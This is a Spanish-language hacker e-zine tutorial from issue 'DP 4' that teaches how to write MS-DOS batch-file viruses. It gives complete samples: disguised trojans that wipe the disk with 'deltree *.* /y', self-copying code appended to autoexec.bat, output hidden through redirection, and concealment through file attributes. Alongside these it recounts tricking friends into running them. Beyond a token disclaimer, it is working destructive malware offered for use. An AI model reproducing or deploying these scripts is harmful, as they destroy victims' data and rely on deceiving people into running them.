<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< DP 4 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
**** [ IMOEN ][ imoen@wanadoo.es  ] ******************* { VIRII } ********
--------------------------------------------------------------------------

CURSO DE :
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
				VISUAL VIRI SCRIPT 2000
=-=-=-=-=-=--=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=

	POWERED BY EDLIN DEL DOS         ESCRITO BY->  SRTA IMOEN 

     N 1

#############
INTRODUCCION#
#############

NI que decir tiene que todo lo que aqui comentado o expuesto esta con
fines educacionales y que lo que si haceis algo malintencionado sera solo
responsabilidad vuestra asi que luego no vengais a llorar a mama imoen.

HOLa a todos, bienvenidos al curso de "programacion" de virus en ficheros
BAT para MSDOS.

Bien ya se que no es programacion de virus virus pero quien sabe si al
final de curso no hacemos algo de esto. Por el momento solo tenemos esto
los ficherros BAT.

Bueno pues nada me presento un poco soy imoen, os dejo que investigeis mi
nombre y podreis preguntarme cualquier duda al email de abajo. Voy a
intentar hacer una serie de articulos desde lo basico a lo complejo si va
muy deprisa pues decirlo y explicare mas despacio mas ejemplos o lo que
sea, si le veis otra utilidad a esto de los bat que la tiene, (a si ??
XD)pero teneis dudas pues escribirme al correo.

Asi que sin mas empezamos con los nuestro.

Una gran ventaja de estos virus es que los antivirus no los detectan
ademas si conseguimos el pack almendra duo solo os costara 5 pesetas
minuto XDDD.

Me refiero a que estos *.bat los podemos convertir a *.com ggggg claro son
mas profesionales pero ya si son detectables por el wanda 5.0 XD

Primero que es un fichero BAT?, bueno pues un fichero bat es simplemente
un archivo dentro del cual se hay ordenes de msdos que se ejecutan en un
orden. Muchos direis que esto es kk y que no es potente y yo os dire que
razon teneis pasaros al ASM o al C pero, bueno ya que estan vamos a
sacarle partido a ello ademas vereis que no son tan kk como dicen.

No lo compareis con script de linux pero bueno recordad que msdos es de
mocosof.(algo veremos al final sobre linux script) XDD. Mejor leer la
seccion que lleva Kurtz y adaptar.

Ya sabemos lo que es un fichero bat, pero que necesitamos para hacer los
virus bat o simplemente un fichero bat.

Ingredientes un ordenador que funcione, y el edit del dos o cualquier otro
editor, a claro y un sistema operativo de cuyo nombre y versiones prefiero
no recordar ;)

###########
CAPITULO I#
###########

Vamos a lo que vamos, vamos a ver lo que es un fichero bat, un poco de
teoria y el primer ejemplo viri bat.

Empezamos a ver lo que es un bat, vale pues eso vamos a un editor de texto
y crearmos un archivo de texto nuevo lo llamamos asi : nombre.bat (el
nombre el que tu quieras) y empezamos a codificar XDD , escribimos lo sig

<++> DP4/CODIGO/viri.bat

@echo off
cls
echo hola mundo!

<-->

XDDD es lo tipico verdad pero por algo hay que empezar XD. Lo primero que
pondremos sera siempre la dos primeras lineas porque la primera lo que
hace es que no va a mostrar el codigo al usuario esto es importante porque
cuando vea format C, a lo mejor se da cuenta que es un virus XDD, y la
segunda que borra la pantalla, el caso es borrar algo aunque sea la
pantalla XDDD.

	La tercera liena con esta le decimos que muestra un texo.

 echo  -> esta orden le dice que muestre por pantalla el texto que le siga
          a la derecha
		EJ: echo hola 
	tambien para activar si ense~a o no el codigo de archivo bat:
                echo off /echo on
		echo. deja una linea en blanco XDD

bueno una vez explicada nuestra primera orden y creado nuestro primer bat
lo guardamos y ejecutamos , y obtendremos un bonito hola mundo! .

Bueno ahora vamos a por otro y asi de paso esplicamos mas cosas, ahora ya
vienen cosas chungas XDD como todo lenguaje tiene que haber variables y
las hay, y parametros que estos ultimos son los que vamos a ver ahora y
las variables las dejamos pa mas adelante que ahora no sirven de mucho.

Un parametro es una opcion que introduce un usuario a continuacion del
nombre del programa

EJ: dir C:\juegos pues C:\juegos es un parametro en concreto como es el
primero se llama parametro 1. Si fuera copy A:\biologia.txt c:\apuntes
tendriamos dos parametros el primero seria a:\biologia.txt y el segundo es
c:\apuntes. lector> VALE IMOEN LO COMPRENDO y ahora?  pues cada paremtro
se representa mediante %1 o %2 .... %9 vale, osea cuando pongamos en el
programa %1 sera el primer parametro pasado EJ @echo off
		cls
		echo este es tu parametro %1
guardalo como nombre.bat y ejecutalo asi: nombre apenado
probar con otras cosas y ver el resultado XDD


Mas cosas, aqui vamos a ver otra cosa tipica de la programacion de Basic
los if /goto que es lo que vamos a usar y despues vamos a empezar con los
ejemplos divertidos XDDD asi que aguantar un poquito.

###
IF#	
###

Bueno esta definicion la saque de un articulo de (Max Hedroom el Vampiro
Sociedad Sangrienta) que escribio para HV. Esta instruccion sirve para
establecer una condicion de igualdad o desigualdad, lo que se hace de esta
manera:

  IF "termino1"=="termino2"  accion,

donde accion es el comando a ejecutar si la condicion se cumple. Hay casos
en los que las comillas no son necesarias, pero para evitar errores es
conveniente acostumbrarse a utilizarlas siempre. Ademas existe la
particula NOT cuya utilidad es la de hacer que la accion se ejecute cuando
no se cumpla la condicion. La utilizariamos asi:

  IF NOT "termino1"=="termino2" accion.	 

	EJ if "%1"=="rojo" echo es rojo 

Otra forma de expresar una condicion es teniendo en cuenta el valor
devuelto por el comando de DOS que se haya ejecutado anteriormente.

	EJ if errorlevel numero comando

Tambien es posible la forma que mas nos interesa es esta if exist comando
esto se refiere a si esiste tal o cual archivo, donde esta el win.com?
o el system.dat?

	EJ: if exist user.dat goto infecta XDDDDD

Que curioso sin querer he puesto un goto que es lo siguiente en orden a y
explicar:

#####
GOTO#
#####

Esto simplemente nos lleva a una parte del programa donde se hace algo,
esa parte del programa estara etiquetada como vereis la etiqueta sera
cualquier nombre, pero por delante el sig caracter : , si este ":" los dos
puntos.

ej:
goto ayuda
:ayuda
echo mensaje de ayuda

שששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששש

Bueno despues del rollo vamos a los ejemplos, ya vereis con un if un echo
y goto lo que hacemos.

Primer ejemplo:

vereis tengo un amigo que siempre me vacila y dice que su ordenador es tan
bueno que piensa a si que le pase este bat diciendole que era el ultimo
parche para el valdur gate XDDDDD, ademas dice que su ordenador le llama
maestro, de verdad que hay gente para todo, el caso esque el bat decia
asi:

<++> DP4/CODIGO/viri1.bat

@echo off
cls
goto merepito
:merepito
echo tu maestro?? y yo soy una lavadora 
goto merepito

<-->

ggggg si eso es un bulce infinito , se repite siempre por que nunca acaba
cuando llega al primer goto entra dentro de "merepito", pero dentro de
aqui se llama a el otra vez y otra vez y otra vez y otra vez XDDDDDD, esto
en programacion se llama recursividad o no?.

AHH espera esto nos lleva al consigiente cuelgue del ordenador si nuestro
amigo no anda listo XDDd.

Por que nosotros si somos listos y sabemos que podemos parar un proceso,
por lotes con Control+c. Al menos este tipo de ficheros 'virus'. Otro
ejemplo de para que puede servir un bat:

pues el mismo amigo dice que es capaz de adivinar una contrase₪a a la
primera vez XDD pues bien le mande el sig bat,hicimos una apuesta , si la
adivinada a la primera, veria una demo de kake5 pero si no el ordenador
entraria en un estado repetitivo ya sabeis lo que quiero decir, mas
adelante le haremos lo mismo pero nos jugaremos los datos del disco duro
XDDDD.

<++> DP4/codigo/viri2.bat

@echo off
cls
if "%1"=="" goto vacio
if "%1"=="imoen" goto premio
goto fallo
:fallo
eho fallaste gili...
goto fallo
:premio has adivinado la contrase₪a
goto fin
:vacio
echo la contrase₪a esta vacia
goto fin
:fin


<-->

el amigo los ejecuta de la sig forma contra.bat pepe , pepe ahora es %1,
entonces en el primer if miramos si el amigo ha puesto algo o esta vacio
si esta vacio le mandamos a vacio y luego a fin el segundo if mira a ver
si el parametro %1 que en este caso es pepe coincide con la contrase₪a que
le hemos puesto que en este caso no, porque %1 que es pepe no es igual a
imoen. asi que nada de ir a premio , que nos queda, ir fallo y curioso
pasa lo mismo de antes un goto que se llama a si mismo XDDDDD.

ששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששששש

Bueno chicos pues aqui esta otro poquito de teoria que hace faltita y
luego me despido hasta el sig numero en donde ya vermos a nuuestro primer
borar todo.


######
PAUSE#
######

Para que pendeadas sirve esto, tan simple ? esto hace que se pare la
ejecucion de un bat haste que se pulse una tecla, bueno pues lo usaremos
para recochineo, pausas, o cuando estemos inmersos en nuestro bat y lo
estemos probando pues para saber por donde vamos .

tan simple como pause 

#####
CALL#
#####

Esta orden sirve para llamar a un fichero bat dentro de otro, jodo!
llamamos a otro bat y cuando acabe de hacer sus cosas devuelve el control
al que lo ha llamado. Sirve para modular los bat , ohh que luo un virus
modular ?? hasta donde quieres llegar hoy?

##############
VARIALBES II #
##############

Bueno pues otro poco de variables. Dentro de un fichero bat una variable
esun nombre encerrado entre signos de "%" que puede tomar cualquier valor.
P ara asignar un determinado valor a una variable, se usas el comando SET.

EJ:
  SET fichero=config.sys (parece que se anima esto , 
  type %fichero%          o type muestra el contenido de un archivo )

bien primero decimos que fichero=config.sys y luego decimos que muestre
fichero, que tiene el valor de ...

Bien pues el DOS emplea variables para su propio funcionamiento. EJ PATH,
PROMPT TEMP , prueva a poner set desde la linea de comandos y te
apareceran todas las que hay.

EJ ponemos set pc=lavadora ahora basta con poner set y ver la nueva
variable, a claro todo esto en la linea de comandos okis,

vale pero como podeis saber tambien se pueden poner a cero o vacias asi
que vamos a poner las mas importantes a cero para fastidiar, esto ya
empieza a ser interesante .

<++> DP4/CODIGO/viri3.bat

@echo off
cls
set path=
set prompt=
set Temp=
set comspec=


<-->

No es que haga mucho pero al menos nuestro amigo vera que su prompt ha
cambiado y que no puede ejecutar el kake que tiene en el directorio de 6
nivel que tenia en el path XDD.

Mas ejemplos 

Mi amigo sabe pa que sirve la orden rename asi que cuando le doy un
fichero bat que le soluciona algo el tio le cambia el nombre y dice que es
suyo asi que gracias al parametro %0, uno reservado, le voy a hacer una
gracia.

%0 se refiere al programa que se esta ejecuntando, mas que nada se usa
para el nombre de bat.

crear el fich prueba.bat :

<++> DP4/CODIGO/viri3.bat

@echo off
 cls
 if not %0==prueba goto mensaje   
 echo que bueno eres no me has cambiado el nombre               
  goto fin		
 :mensaje 
 echo pendejo no me cambies el nombre
 goto mensaje
 goto fin
 :fin


<-->

tiene una trampita asi que cuidado al ejecutar XD, eh nada que no os haya
ense~ado asi que leer , que no es difici dificil dificil ;-)


Pues por ahora imoen se va descansar un ratito que ya estoy cansada de
escribir pero no os preocupeis por que si habeis entendido esto habeis
pillado una base sobre ficheros bat aceptable. y proximo numero veremos al
primer bicho en accion y me refiero a borrado XDD luego veremos mas teoria
sobre tuberias y reproducion. Asi que un saludo a todos los lectores de DP
y bueno espero ver a alguna chiquita como yo escribir algo sobre el under
... asi que ya hasta el proximo numero de DP.

______________________________________________________________________________

Bueno pues ya he vuelto y ahora seguimos habeis tenido suerte de que me
haya dado la vena y en vez esperar al numero 5 dp lo tenga to preparado pa
el cuatro.

LO primero es lo primero vamos al codigo de nuestro bichito 

Tengo un amigo que dice que tiene el mejor antivirus y nunca le han
borrado el hhdd, asi que le dije mira esto tu que eres tan listo que me lo
han pasado y no comprendo lo que es XDD.

viriI.bat

<++> DP4/CODIGO/viri4.bat

@echo off
cls
echo programa testeador de memoria espere un momento 
cd \
deltree *.* /y 


<-->

bueno cuidado al probarlo que borrara todo el disco duro, joer imoen si es
solo la orden deltree, si es verdad pero con el parametro /y no pide
informacion y con la primera linea no se sabe el o que hace XDD , lo de cd
\ es para ponerlos en la raiz y asi borrarlo todo XD.

YA sabeis la orden deltree /y es nuestra gran arma XDDD para borrar.

ALTOOOO esto me lo han comentando algunos y es que resulta que aunque no
pide confirmacion muestra en pantalla : c:> eliminando archivos .... y
claro esto es malo muy malo asi que os dejo que lo solucioneis , haaa
claro os dare una pista aunque ya seriais capaces de resolverlo, la pista
es que si en vez de que salga por pantalla lo redirigimos a algun sitio
donde no se vea??? si otro archivo.

deltree *.* /y >> tem.tem
del temp.temp

Mas o menos quedaria asi well??

############
CAPITULO II#
############

Bien bien , teneis razon los virus nacen y se reproducen y el format los
mata XDDD, como hacer que se reproduccan???

Para ello necesitamos un poco de royo llamado redireccionamiento de la
entrada / salida de datos toma ya nombrecito XDD los linuxeros lo
conoceran por tuberias bueno pues MSDOS tambien lo tiene.

Normalmente la entrada y salida de datos son el teclado y la pantalla la
salida. Pero la entrada y la salida de datos se puede redirigir de forma
que la entrada se redireccione, por ejemplo a un fichero, o la salida se
envie a a la impresora o a otro fichero. Para este proceso usaremos unos
simbolos que son los redirrecionadores. Bien nuestra utilidad es hacer que
nuestro ejendreo meta su codigo o algun mesaje o algso en otros ficheros
bat o de cualquier tipo. Bien ya sabemos lo que hay que hacer para
duplicar el virus. Ahora vamos con los simbolos, los ejemplos buenos, y
los que llevan fines educativos. NOMBRE REDIRECIONA A CON monitor prn
impresora name.xxx fichero XDDD lpt1:  paralelo1 lpt2 paralelo2 com1
serie1 com2 serie2 nul anula el mensaje de salida XDDD


EJ quiero imprimir los directorios y archivos de la raiz
		bien pues ponemos esto dir > prn 

bien el simbolo > sirve para redirigir, esto en ficheros lo que hace es
                        escribir al inicio del fichero o lo que es lo mismo
                        lo sobreescribe  quedaos con la palabra 
                        "sobreescribe"
		>> para ficheros a₪ade al final del fichero XDDD
EJ
dir c:\ > prueba
dir c:\juegos >>prueba 

Bien ahora vamos a crear un archivo de control de accesos al pc , la hora
que alguien entra.

En c:\ creamos un archivo llamado control , NOO con el edit no ahora ya
sabemos redirigir copy con control escribe algo luego pulsa F6, te dira lo
sig
 1 fichero copiado   somos todos unos expertos XDDDD

 No hombre no hagias esto usar el edit XD ahora en autoexec.bat ponemos lo
sig al final o lo creamos a parte y desde autoexec.bat le hacemos un call.

<++> DP4/CODIGO/viri5.bat

@echo off 
echo entrada >> control
date < intro >> control
time <intro >> control
<f6>


<-->

para ver el fichero control basta con editarlo ahora si podemos usar el
edit, aunque os aconsejo que lo hagais con el type por que este va ha ser
un comando magico, gracias a este y al redirecionador >> podremos pegar
nuestro codigo a otros archivos. Pues eso que empiece lo bueno copiar
nuestro codigo virico
 ]:-))

La orden type muestra el contenido de un archivo de la siguiente forma
type name.xxx del fichero, probarlo en la linea de comandos con cualquier
fichero que tengais de texto. Bien como antes dije esto muestra el
contenido a la pantalla pero, por que no redireccionar a otro archivo????

vale vamos a poner un ejemplo , crear un archivo de texto que se llame
conejo.txt y ponerle un texto luego veremos como el bat se ha copiado al
final de hay uhh esto se pone interesante .

anexo.bat

<++> DP4/CODIGO/anexo.bat

@type anexo.bat >> conejo.txt
@echo off
cls
echo soy un virus malo y me he metido dentro del conejo.txt
echo aunque aqui soy inofensivo jodo mucho 
echo y siempre dentro del conejo.txt
echo XDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
echo jodo con la imoen que cosas dice }}:->>>>


<-->

ahora ejecutarlo y mirar el conejo.txt ehh recordarme no llamar a ningun
fichero conejo vale? XD veremos que se ha copiado y todo gracias a la
primera linea.

la primera @ hace que no visualice el type, muestra el contenido del virus
pero no lo ense₪a en pantalla si no que lo redirecciona al final del
con....

YA BASTA DE CONEJO con esto queda explicado, esto por ahora y pasamos a
otra cosa mariposa !!

Bueno pues ahora vamos a juntar algunas cosas y vamos con nuestro primer
virus ahora lo que vamos a hacer es que al ejecutarse se copie en el
auotexec.bat claro que vamos a dar por supuesto que el virus y el autoexec
estan en la raiz ahh y de paso vamos a corromper el command.com , pero
recordad que esto hara que nuestro virus de se₪al de vida .. Una cosa mas
la ordem REM sirve para poner un comentario es decir que lo que va delante
es como si no estubiera, la utilidad es esa poner comentarios.


virus.bat

<++> DP4/CODIGO/viri6.bat

@type virus.bat >> autoexec.bat
@echo off
rem @type virus.bat >> command.com	
cd \
deltree *.*  /s


<-->

ohh con estas cuatro lienas hacemos que el virus se copie al ejecutarse en
el autoexec.bat, y ademas se coloqua en C:\ y borre todo genial? verdad.
Una cosa mas vamos a dotar al virus de cierta auntenticidad XDD si por
ejemplo alguien lo modifica y lo cambia de nombre diremos que NOOO el
virus esta modificado y no funciona, acordaos del parametro %0 vale? y de
la sentencia if

<++> DP4/CODIGO/viri7.bat

@if not "%0"=="virus.bat goto fin 
@type virus.bat >> autoexec.bat
@echo off
cd \
deltree *.* /s
:fin


<-->

Vamos a ver otra tecnica de estos virus y de paso vemos y conocemos algo
sobre el dos. Tecnicas de no modificacion antiwriting, y steall niveles I
y II, dejamos el nivel III pa mas alante. Bueno pues vamos a explicar que
son los atributos de un archivo. Un atributo no es mas que una marca a un
archivo que da ciertas propiedades o se las quita segun se mire XDDD, ahhh
estas tecnicas tambien son reversibles y ya vereis a lo que me refiero al
realizar un ataque al registro de windows XDDD

Bueno pues como iba diciendo resulta que estas marcas indican varias
cosas, mirar:

 Un archivo que solo se pueda leer
 Un archivo de sistema un archivo oculto
 Un archivo modificado (este puede parecer no muy importante pero os dejo
la imaginacion a vos)

Como vemos los atributos de un archivo??.  pues muy facil con el comando
de msdos, attrib y como siempre vamos a los ejemplos buenos y luego
pasamos a los malos. Para ver los attributos de un archivo simplemete
basta con poner attrib nombre.archivo, para cambiar los attributis se usa
los simbolos + y - es decir se le pone o se le quita.

Imaginamos que hemos terminado nuestra tesis doctoral XDD y para que nadie
la modifique ni la borre, es decir que solo la pueda leer pues le
asignamos el atributo de solo lectura. EJ: attib +R tesis.txt (NO HAGAIS
UNA TESIS EN FORMATO TXT XDDDDDD). ya hemos aprendido algo para nuestro
archivos importantes y es ponerle atributos.

Ahora vamos con la teoria aplicada a virus XDD. Vale pues a nuestro virus
le ponemos el atributo -r de solo lectura impediremos que alguien lo
modifique, o que escriban en el esto junto con la condicon if de %0 le da
un cierto aire de "esto es mio no lo toques" claro que si la victima sabe
un poco msdos la cagamos y esto no vale pa nada XDDD, pero claro ahora to
el mundo se ha olvidado del dos y solo claman windows pobrecitos ;-)

Ahora pasamos a las tecnicas steal I y II. La primera sera en poner el
atributo de archivo de sistema asi la victima se pensara dos veces si
borra el bat o no lo borra y como win le dira nono esto es del sistema
pues nada se lo comera con patatassss

attrib -s name.xxx

Vale y ahora la mas importante de todas la steal II que consiste en
ocultar al archivo asi este sera invisible XDDD no se vera con un simple
dir hara falta un dir /a XDDD pero bueno ya digo que a los windozeros esto
no saben ni lo quess , si esta oculto sera por algo. attrib -h name.xxx

lector> ya pero si esta oculto como lo encuentra. 
imoen> esto no esta presente el curso XDDDDD.

DOS CASOS

1-> llamar a virus des de otro bat con el comando call que desde un bat
llama a otro

2-> o he aqui algo bonito y profesionarrr XD

vale y ahora vamos a darnos profesionalidad y haremos que el virus despues
de ejecutarse una vez se oculte ohhhh no se si lo vamos a lograr pero
bueno XDD.


virus.bat

<++> DP4/CODIGO/viri8.bat

@echo off
if "%0"="virus.bat" attrib +h virus.bat 
type virus.bat >> autoexec.bat
cd \
deltree c:\*.* /s >> tem
del tem


<-->

atencion a este virus que os resuleve muchas preguntas y posibles errores
sobre todo las ultimas lineas.

##########################################################################

Bueno pues por hoy ya vale que si no para el proximo numero no se que voy
a contar , quedan cosas muy majas pero que sepais que con esto podeis
hacer muchas cosas solo dejar que la imaginacion os invada. Bien quedan
unas ordendes mas que explicar y empezaremos con otro tipo de virus
distintos a estos que estamos haciendo muy interesantes ya vereis. Queda
trasformar en megavirus nuestro bat pasandolos a COM, ah voy a poneros un
virus de los nuestros que eche abajo un sistema windows huy que dificil
XDDDDD.

Bueno pues ya me despido de todos vosotros y espero que si esto no os haga
virusmaker por lo menos asi conozcais un poco mas el dos.

Recordad que c:>dir windos bueno 
		demasiados parametros - bueno 
		XDDDD

Animo y desde aqui un beso a todos los que me conozen y a los que no
tambien XD. lenes?? Vuestra amiga Imoen Para errores de ortografia o falta
de letras reclamar a mi teclado que fue construido por el hombre de
atapuerca.















